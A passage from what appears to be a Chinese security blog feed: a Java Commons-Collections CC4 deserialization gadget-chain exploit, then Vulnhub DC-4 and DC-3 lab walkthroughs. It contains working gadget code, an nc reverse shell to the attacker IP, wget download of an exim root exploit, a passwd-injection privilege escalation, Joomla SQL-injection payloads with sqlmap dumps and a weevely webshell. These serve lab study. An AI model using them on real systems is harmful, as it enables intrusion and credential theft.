class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">//动态类加载命令执行  </span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">                instantiateTransformer  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);  </span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  </span><br><span class="line">        serialize(priorityQueue);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这里弹出计算器失败说明中间出了问题，debug一下，断点如下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051248413.png" alt="image-20230705124810172"><br>问题出在下面<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051248848.png" alt="image-20230705124816746"><br>调试发现并没有进入<code>siftDown</code>方法，而我们要求就是要进入，寻找一下原因</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br></pre></td></tr></table></figure><p>当代码走到这里的时候size为0，当size为1的时候右移1位还是0<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051248594.png" alt="image-20230705124853515"><br>当size为2即可得到1进入for循环，而这个size就是队列的长度，那么我往这个队列里面加点东西就行了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">priorityQueue.add(<span class="number">1</span>);  </span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051249225.png" alt="image-20230705124905041"><br>此时弹出计算器了，但是这里报错，当我把序列化与反序列化注释之后还是弹了计算器<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061925481.png" alt="image-20230706192532303"><br>说明这个计算器弹的和序列化没关系，问题就出在了这个<code>priorityQueue.add(1);</code>跟进去看一下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061925964.png" alt="image-20230706192237127"><br>发现这个add直接会进入到compare方法，直接就在本地执行了没玩的了，所以得避免本地执行<br>报错的原因其实是CC3里的<code>_tfactory</code> 值，都忘了这是干嘛的了，在前面的exp中少了一句<code>templates.newTransformer();</code>导致报错加上就行了如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure><p>但其实这里根本没啥关系，本来就不想让它在本地执行，解决add的问题和前面CC1（好像是不记得了）一样把<code>transformingComparator</code> 的值改为一个无关的对象，在 add 完之后再用反射修改回来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">//动态类加载命令执行  </span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">                instantiateTransformer  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));  </span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  </span><br><span class="line">  </span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);  </span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);  </span><br><span class="line">        transformField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        transformField.set(transformingComparator, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        serialize(priorityQueue);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051249793.png" alt="image-20230705124940577"></p><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p>感觉CC4学的挺轻松的，不过前面的有些东西忘记了，还是要多总结，流程图如下，直接画在一堆了不单独画了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307062015392.png" alt="image-20230706201426369"></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-4</title>
      <link href="/undefined/34858.html"/>
      <url>/undefined/34858.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>下载地址：<a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></p><h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><p>扫描存活IP<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042110558.png" alt="image-20230704210958475"><br>访问出现一个登录界面，我的7万数据大字典都没爆出来。。。难道不是弱口令？？靠admin&#x2F;admin进去了，我的大字典没有？？仔细查看发现根本没做密码验证。。。<br>进入可以执行三个Linux命令<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042111368.png" alt="image-20230704211027412"><br>抓个包发现是任意代码执行，直接写入webshell发现存在过滤<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042110895.png" alt="image-20230704211037843"><br>base64之后显示写入成功，但是查看又没有文件就很奇怪，看了wp发现直接弹shell，也对啊，都能命令执行了为啥不试试弹个shell呢。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">radio=nc+192.168.75.128+6666+-e+/bin/bash&amp;submit=Run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042111871.png" alt="image-20230704211134821"><br>然后用python获取个交互式shell，查看root没有权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042112524.png" alt="image-20230704211155202"></p><h2 id="exim提权"><a href="#exim提权" class="headerlink" title="exim提权"></a>exim提权</h2><p>然后就是提权了，查看具有suid权限的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042112458.png" alt="image-20230704211250399"><br>存在exim4这个可以用来提权，查看一下版本<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113715.png" alt="image-20230704211301624"><br>然后msf直接搜相对应的exp<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113333.png" alt="image-20230704211312249"><br>我这里将exp复制到了我的用户目录下，然后用python起了一个临时服务，再在靶机上使用wget下载exp到tmp目录下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113032.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-4:/tmp$ wget http://192.168.75.128:8000/46996.sh</span><br><span class="line">wget http://192.168.75.128:8000/46996.sh</span><br><span class="line">--2023-07-04 22:29:12--  http://192.168.75.128:8000/46996.sh</span><br><span class="line">Connecting to 192.168.75.128:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3552 (3.5K) [text/x-sh]</span><br><span class="line">Saving to: &#x27;46996.sh&#x27;</span><br><span class="line"></span><br><span class="line">46996.sh            100%[===================&gt;]   3.47K  --.-KB/s    in 0s      </span><br><span class="line"></span><br><span class="line">2023-07-04 22:29:12 (62.2 MB/s) - &#x27;46996.sh&#x27; saved [3552/3552]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113307.png" alt="image-20230704211335280"><br>然后给文件赋执行权限再运行即可提升到root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 46996.sh</span><br><span class="line">./46996.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113770.png" alt="image-20230704211344723"><br>root目录下得到flag<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113536.png" alt="image-20230704211352490"></p><h2 id="teehee提权"><a href="#teehee提权" class="headerlink" title="teehee提权"></a>teehee提权</h2><p>这里我直接记录提权的一部分了，前面的直接省略了，感兴趣可以在网上看其他的wp，通过前面的操作可以得到charles用户的密码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su charles</span><br><span class="line">^xHhA&amp;hvim0y  #密码</span><br></pre></td></tr></table></figure><p>切换到这个用户使用命令<code>sudo -l</code>查看具有root权限的命令<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042114230.png" alt="image-20230704211405178"><br>发现有个teehee命令<br><strong>teehee命令可以写入文件内容并不覆盖文件原有内容</strong><br>可以用这个命令写入一个无密码的admin用户到&#x2F;etc&#x2F;passwd文件，并加入到root组中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042114723.png" alt="image-20230704211410690"><br>然后切换到admin用户成功变为root权限<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042114681.png" alt="image-20230704211418608"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--DC-3</title>
      <link href="/undefined/64126.html"/>
      <url>/undefined/64126.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>下载地址：<a href="http://www.five86.com/downloads/DC-3-2.zip">http://www.five86.com/downloads/DC-3-2.zip</a><br>镜像地址：<a href="https://download.vulnhub.com/dc/DC-3-2.zip">https://download.vulnhub.com/dc/DC-3-2.zip</a><br>在打开的时候出了一个问题，如下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031340292.png" alt="image-20230703133956196"><br>解决方法：在CD&#x2F;DVD高级设置里面改为如下即可<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031340610.png" alt="image-20230703134012551"></p><h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><p>从DC-3开始只有一个flag，得提权到root才能拿到<br>扫描存活IP，记得改为NAT连接<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031340977.png" alt="image-20230703134029937"><br>IP为<strong>192.168.75.136</strong><br>探测一下存活端口<br><code>nmap -A 192.168.75.136 </code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031340327.png"><br>扫一下目录看看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031341959.png" alt="image-20230703134126915"><br>有个后台，先放着，访问一下IP利用插件发现CMS为Joomla<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031341778.png" alt="image-20230703134155733"></p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>看下有没有历史漏洞，发现存在sql注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.75.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031342864.png" alt="image-20230703134218819"><br>然后用sqlmap一把梭看看有什么东西吧，将数据包保存在注入的参数加个<code>*</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031342657.png" alt="image-20230703134236625"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r &quot;/home/joker27/桌面/111.txt&quot; --dbs</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031342672.png" alt="image-20230703134249625"><br>到这里就没啥利用思路了，表实在太多了，懒得一个个猜，看看wp吧，发现有个专门针对joomla的工具安装一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install joomscan</span><br></pre></td></tr></table></figure><p>开扫<code>joomscan -u http://192.168.75.136</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031343261.png" alt="image-20230703134305215"><br>看到了版本为3.7.0，这个版本有sql注入前面已经利用过了，从wp得知密码在<code>#__users</code>表中，本来想通过我前面的注入方法直接查看的，但是发现没法查看数据了，只能通过msf来看一下了，没怎么用过msf都不太熟练</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla 3.7.0</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031343141.png" alt="image-20230703134335109"><br>看wp这里不能用msf直接打，所以就直接看看payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031343915.png" alt="image-20230703134346862"><br>因为前面的东西都已经注出来了所以直接注列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &#x27;#__users&#x27; --columns -p list[fullordering]</span><br></pre></td></tr></table></figure><p>得到列名<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031344803.png" alt="image-20230703134406761"><br>接下来查看数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &#x27;#__users&#x27; -C name,password,username --dump -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031344583.png" alt="image-20230703134421547"><br>密码是加密的用john爆破一下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031345400.png" alt="image-20230703134432752"><br>得到密码snoopy，登录一下后台，成功登录<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031345190.png" alt="image-20230703134547119"></p><h2 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h2><p>接下来找找有没有上传点啥的，最终在下面这里发现可以直接生成文件<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346665.png" alt="image-20230703134607616"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346305.png" alt="image-20230703134618256"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346130.png" alt="image-20230703134633073"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346542.png" alt="image-20230703134644502"><br>害，找路径找了半天。。。<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346356.png" alt="image-20230703134658292"><br>我这台机器没装蚁剑换个工具，利用kali自带的weevely</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate cmd shell.php //生成shell</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031347730.png" alt="image-20230703134712673"><br>但是直接上传失败估计限制了，那么就直接将代码复制到之前的那个1.php里面<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031347122.png" alt="image-20230703134729073"><br>连接成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http://192.168.75.136/templates/bezz3/1.php cmd  //连接</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031348106.png" alt="image-20230703134812024"><br>使用命令<code>cat /etc/issue</code>查看系统发行版本信息<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031351895.png" alt="image-20230703135102848"></p><h2 